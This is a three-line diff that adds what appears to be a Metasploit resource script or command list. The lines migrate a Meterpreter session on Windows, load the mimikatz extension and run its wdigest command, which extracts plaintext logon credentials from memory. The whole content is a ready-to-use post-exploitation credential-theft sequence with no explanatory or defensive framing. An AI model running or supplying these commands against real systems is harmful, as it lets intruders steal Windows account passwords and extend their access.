@@ -1,0 +1,3 @@
+run post/windows/manage/migrate
+load mimikatz
+wdigest
